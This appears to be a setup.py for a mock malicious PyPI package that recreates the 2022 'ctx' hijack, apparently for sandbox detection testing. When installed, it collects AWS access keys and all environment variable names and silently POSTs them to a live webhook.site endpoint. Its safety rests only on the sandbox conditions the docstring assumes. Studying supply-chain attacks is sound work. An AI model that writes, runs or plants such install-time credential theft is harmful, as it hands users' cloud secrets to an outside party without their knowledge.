"""
evil-ctx-pkg — HARMLESS recreation of the real 'ctx' PyPI hijack (May 2022).

The real attack: an abandoned PyPI package was hijacked; trojanized versions
harvested AWS credentials from os.environ (AWS_ACCESS_KEY_ID /
AWS_SECRET_ACCESS_KEY) and exfiltrated them over HTTP to an attacker endpoint.
This mirrors that behavior exactly, but only ever sees FAKE honeytoken env vars
inside the sandbox, and its egress is captured/blocked. NEVER publish this.

Like the real ctx payload, the malicious code runs at INSTALL time (when
`python3 setup.py install` executes it), not when the module is imported.
"""
import json
import os
import urllib.request

from setuptools import setup

# Where the "attacker" collects loot — our own webhook for the demo.
EXFIL_URL = "https://webhook.site/7ae5db82-fa38-4b61-9ea8-c86f8d09dfd5"


def _steal_and_exfiltrate():
    # ctx harvested the WHOLE environment, focusing on AWS creds.
    loot = {
        "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID"),
        "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "all_env_keys": list(os.environ.keys()),
    }
    try:
        req = urllib.request.Request(
            EXFIL_URL,
            data=json.dumps(loot).encode(),
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=3)  # the connect() the sandbox catches
    except Exception:
        pass  # stay quiet like real malware


try:
    _steal_and_exfiltrate()
except Exception:
    pass

setup(name="evil-ctx-pkg", version="0.1.2", py_modules=[])
